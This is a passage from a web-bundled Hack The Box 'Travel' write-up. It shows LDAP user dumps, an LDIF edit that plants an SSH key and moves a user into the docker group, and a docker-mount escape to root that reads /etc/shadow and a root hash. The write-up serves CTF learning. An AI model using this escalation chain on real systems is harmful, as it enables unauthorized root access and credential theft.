5000\nhomeDirectory: /home/eugene\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\n\n# gloria, users, linux, servers, travel.htb\ndn: uid=gloria,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: gloria\nuidNumber: 5010\nhomeDirectory: /home/gloria\ngivenName: Gloria\ngidNumber: 5000\nsn: Wood\ncn: Gloria Wood\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\nloginShell: /bin/bash\n\n# johnny, users, linux, servers, travel.htb\ndn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: johnny\ncn: Johnny Miller\nsn: Miller\ngivenName: Johnny\nloginShell: /bin/bash\nuidNumber: 5004\ngidNumber: 5000\nhomeDirectory: /home/johnny\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\n\n# louise, users, linux, servers, travel.htb\ndn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: louise\ncn: Louise Griffin\nsn: Griffin\ngivenName: Louise\nloginShell: /bin/bash\nuidNumber: 5007\ngidNumber: 5000\nhomeDirectory: /home/louise\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\n\n# christopher, users, linux, servers, travel.htb\ndn: uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: christopher\nuidNumber: 5003\nhomeDirectory: /home/christopher\ngivenName: Christopher\ngidNumber: 5000\nsn: Ward\ncn: Christopher Ward\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\nloginShell: /bin/bash\n\n# domainusers, groups, linux, servers, travel.htb\ndn: cn=domainusers,ou=groups,ou=linux,ou=servers,dc=travel,dc=htb\nmemberUid: frank\nmemberUid: brian\nmemberUid: christopher\nmemberUid: johnny\nmemberUid: julia\nmemberUid: jerry\nmemberUid: louise\nmemberUid: eugene\nmemberUid: edward\nmemberUid: gloria\nmemberUid: lynik\ngidNumber: 5000\ncn: domainusers\nobjectClass: top\nobjectClass: posixGroup\n\n# search result\nsearch: 2\nresult: 0 Success\n\n# numResponses: 22\n# numEntries: 21\n")),(0,r.kt)("p",null,"By the way, since the hostname, base & bind dn are specified inside ",(0,r.kt)("inlineCode",{parentName:"p"},".ldaprc")," we\ncan enter ",(0,r.kt)("inlineCode",{parentName:"p"},"ldapsearch -x -w Theroadlesstraveled")," instead of the full command."),(0,r.kt)("p",null,"It seems our account is LDAP admin so we can configure it."),(0,r.kt)("p",null,"Let's see interesting groups:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat /etc/group | grep trvl\nadm:x:4:syslog,trvl-admin\ncdrom:x:24:trvl-admin\nsudo:x:27:trvl-admin\ndip:x:30:trvl-admin\nplugdev:x:46:trvl-admin\nlxd:x:116:trvl-admin\ntrvl-admin:x:1000:\n\n$ cat /etc/group | grep docker\ndocker:x:117:\n")),(0,r.kt)("p",null,"Then we can add a key to a user and change it's base groupe to docker & user to\ntrvl-admin (not required)."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ldif"},"dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nchangeType: modify\nadd: objectClass\nobjectClass: ldapPublicKey\n-\nadd: sshPublicKey\nsshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDC/yatK67NXLmgt1LepjDbW2b7lE6z7Y8aIlveOGb6Lp48w0X9qTYNtqe7tgXQCN0qbMlhARBekVewayh4XouStOoEz7jeT8v4vL6awy0XwrqA/asj/LNjDOjAVGBtOsnPn9qE4JXsxQLBGlxouETwrZSUh1FMQFSzO77FasFQO8k59XO9cgCYj/b+TjM+IV5S6uSZPlmchmeT3abJjBaE+JHZ3V9wpCcOZ8v/kMEL+2jW4Rc6R7ChuQeZmNbkZxOx+xiJIu/otpMwrLhApG8zQ3Gm2sCWa1Xg1PjzIga4TD11VHoPgaeqTPhML4Y+zx4WUv8zib3Fl3boYapqiHQy0BMM6knfnCCu+gpkurBtJOqr/4rnq2bL/akVWjjPs3SbKdluQiBp6L8ZJ9dLz2JTpV0TsEEelbnYXT0jY13iAU+iZTnAiJJL/suTFuk1jAvIO8sz1wc8oi0BXaITbaUpKQAnkREdR6rJItH/MO9R2GnPKPby9KshKcvn9eL+jBk= cyfun@penarch\n-\nreplace: gidNumber\ngidNumber: 117\n-\nreplace: uidNumber\nuidNumber: 1000\n")),(0,r.kt)("p",null,"Then we can connect via SSH because the SSHD config is the following:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat /etc/ssh/sshd_config | grep -v '#'\nInclude /etc/ssh/sshd_config.d/*.conf\nAuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys\nAuthorizedKeysCommandUser nobody\nChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp  /usr/lib/openssh/sftp-server\nPasswordAuthentication no\nMatch User trvl-admin,lynik-admin\n        PasswordAuthentication yes\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ssh -i ~/.ssh/id_rsa louise@travel.htb\ntrvl-admin@travel:/$ id\nuid=1000(trvl-admin) gid=117(docker) groups=117(docker),5000(domainusers)\n")),(0,r.kt)("p",null,"Then let's see images available in docker:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"trvl-admin@travel:/$ docker images\nREPOSITORY            TAG                 IMAGE ID            CREATED             SIZE\nnginx                 latest              602e111c06b6        4 months ago        127MB\nmemcached             latest              ac4488374c89        4 months ago        82.3MB\nblog                  latest              4225bf7c5157        4 months ago        981MB\nubuntu                18.04               4e5021d210f6        5 months ago        64.2MB\njwilder/nginx-proxy   alpine              a7a1c0b44c8a        7 months ago        54.6MB\nosixia/openldap       latest              4c780dfa5f5e        11 months ago       275M\n")),(0,r.kt)("p",null,"Now that we are in the docker group it's easy pe thanks to ",(0,r.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/docker/"},"gtfobins"),". By the way we can search gtfobins\nlocally via two CLI tools: ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/mzfr/gtfo"},"gtfo")," and ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/nccgroup/GTFOBLookup"},"gtfoblookup"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ gtfo -b docker\n...\n# The resulting is a root shell.\nCode:   docker run -v /:/mnt --rm -it alpine chroot /mnt sh\nType:   shell\n...\n\n$ gtfoblookup linux shell docker\ndocker:\n\n    shell:\n\n        Description: The resulting is a root shell.\n        Code: docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"trvl-admin@travel:/$ docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash\nroot@d9ba81203eb5:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@d9ba81203eb5:/# cat /root/root.txt\n189d55aa326f561c68c69a547ba2df0f\nroot@d9ba81203eb5:/# cat /etc/shadow | grep root\nroot:$6$p6a8fCN5/L4rm3FA$bwV15SC9j7QwaRwolnptinKydaRp9O3826E8QlFyrVmjxoaIvs6A.Aw7Z/VCRgGXu0cjLYfmznespEhTS8ZUe/:18397:0:99999:7:::\n")),(0,r.kt)("p",null,":"))}d.isMDXComponent=!0},88807:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/travel-7d9999ff283ecbbdd6b3610add08e64b.png"}}]);